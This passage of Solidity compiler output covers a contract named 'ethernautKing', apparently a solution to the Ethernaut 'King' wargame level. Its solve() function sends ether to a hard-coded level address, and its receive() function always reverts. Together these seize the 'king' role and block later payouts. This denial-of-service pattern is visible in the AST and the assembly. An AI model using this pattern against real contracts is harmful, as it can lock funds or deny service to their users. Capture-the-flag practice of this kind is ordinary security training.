											"begin": 768,
											"end": 814,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "PUSH",
											"source": 0,
											"value": "3F"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 681,
											"end": 822,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 655,
											"end": 822,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 405,
											"name": "tag",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 7,
											"end": 405,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 166,
											"end": 169,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 187,
											"end": 270,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 268,
											"end": 269,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 263,
											"end": 266,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 187,
											"end": 270,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 187,
											"end": 270,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 187,
											"end": 270,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 187,
											"end": 270,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 180,
											"end": 270,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 180,
											"end": 270,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 279,
											"end": 372,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 368,
											"end": 371,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 279,
											"end": 372,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 279,
											"end": 372,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 279,
											"end": 372,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 279,
											"end": 372,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 397,
											"end": 398,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 392,
											"end": 395,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 388,
											"end": 399,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 381,
											"end": 399,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 381,
											"end": 399,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 405,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 7,
											"end": 405,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 7,
											"end": 405,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 405,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 411,
											"end": 790,
											"name": "tag",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 411,
											"end": 790,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 595,
											"end": 598,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 617,
											"end": 764,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 760,
											"end": 763,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 617,
											"end": 764,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 617,
											"end": 764,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 617,
											"end": 764,
											"name": "tag",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 617,
											"end": 764,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 610,
											"end": 764,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 610,
											"end": 764,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 781,
											"end": 784,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 774,
											"end": 784,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 774,
											"end": 784,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 411,
											"end": 790,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 411,
											"end": 790,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 411,
											"end": 790,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 411,
											"end": 790,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 796,
											"end": 943,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 796,
											"end": 943,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 897,
											"end": 908,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 934,
											"end": 937,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 919,
											"end": 937,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 919,
											"end": 937,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 796,
											"end": 943,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 796,
											"end": 943,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 796,
											"end": 943,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 796,
											"end": 943,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 796,
											"end": 943,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 949,
											"end": 1063,
											"name": "tag",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 949,
											"end": 1063,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 949,
											"end": 1063,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 949,
											"end": 1063,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"solve()": "890d6908"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"solve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"ethernautKing.sol\":\"ethernautKing\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"ethernautKing.sol\":{\"keccak256\":\"0x0e7407deccd45d696ae131057bc82f402740b0727c9bfddf3c2918f167af3d65\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://eb29bc97ff23245711c4bf24eb6c9ab1415cd7f0200707661813b34ed0289831\",\"dweb:/ipfs/QmYF3htQra5DzfinU96RdZo7aUU7CF845WQaB68UgrpZbM\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "9302",
				"formattedMessage": "Warning: Return value of low-level calls not used.\n  --> ethernautKing.sol:35:9:\n   |\n35 |         contractAddr.call{value: 1000000000000001}(\"\");\n   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 814,
					"file": "ethernautKing.sol",
					"start": 768
				},
				"type": "Warning"
			}
		],
		"sources": {
			"ethernautKing.sol": {
				"ast": {
					"absolutePath": "ethernautKing.sol",
					"exportedSymbols": {
						"ethernautKing": [
							29
						]
					},
					"id": 30,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".7"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 29,
							"linearizedBaseContracts": [
								29
							],
							"name": "ethernautKing",
							"nameLocation": "601:13:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 4,
										"nodeType": "Block",
										"src": "645:2:0",
										"statements": []
									},
									"id": 5,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "634:2:0"
									},
									"returnParameters": {
										"id": 3,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "645:0:0"
									},
									"scope": 29,
									"src": "622:25:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 20,
										"nodeType": "Block",
										"src": "681:141:0",
										"statements": [
											{
												"assignments": [
													9
												],
												"declarations": [
													{
														"constant": false,
														"id": 9,
														"mutability": "mutable",
														"name": "contractAddr",
														"nameLocation": "700:12:0",
														"nodeType": "VariableDeclaration",
														"scope": 20,
														"src": "692:20:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 8,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "692:7:0",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 11,
												"initialValue": {
													"hexValue": "307835353764363334323538423335334241433046376431376438303744414145373438353146363338",
													"id": 10,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "715:42:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													},
													"value": "0x557d634258B353BAC0F7d17d807DAAE74851F638"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "692:65:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"hexValue": "",
															"id": 17,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "811:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															},
															"value": ""
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																	"typeString": "literal_string \"\""
																}
															],
															"expression": {
																"id": 12,
																"name": "contractAddr",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 9,
																"src": "768:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 14,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "call",
															"nodeType": "MemberAccess",
															"src": "768:17:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
															}
														},
														"id": 16,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"names": [
															"value"
														],
														"nodeType": "FunctionCallOptions",
														"options": [
															{
																"hexValue": "31303030303030303030303030303031",
																"id": 15,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "793:16:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1000000000000001_by_1",
																	"typeString": "int_const 1000000000000001"
																},
																"value": "1000000000000001"
															}
														],
														"src": "768:42:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 18,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "768:46:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"id": 19,
												"nodeType": "ExpressionStatement",
												"src": "768:46:0"
											}
										]
									},
									"functionSelector": "890d6908",
									"id": 21,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "solve",
									"nameLocation": "664:5:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 6,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "669:2:0"
									},
									"returnParameters": {
										"id": 7,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "681:0:0"
									},
									"scope": 29,
									"src": "655:167:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 27,
										"nodeType": "Block",
										"src": "857:27:0",
										"statements": [
											{
												"expression": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 24,
														"name": "revert",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967277,
															4294967277
														],
														"referencedDeclaration": 4294967277,
														"src": "868:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_revert_pure$__$returns$__$",
															"typeString": "function () pure"
														}
													},
													"id": 25,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "868:8:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 26,
												"nodeType": "ExpressionStatement",
												"src": "868:8:0"
											}
										]
									},
									"id": 28,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 22,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "837:2:0"
									},
									"returnParameters": {
										"id": 23,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "857:0:0"
									},
									"scope": 29,
									"src": "830:54:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 30,
							"src": "592:295:0",
							"usedErrors": []
						}
					],
					"src": "33:856:0"
				},
				"id": 0
			}
		}
	}
}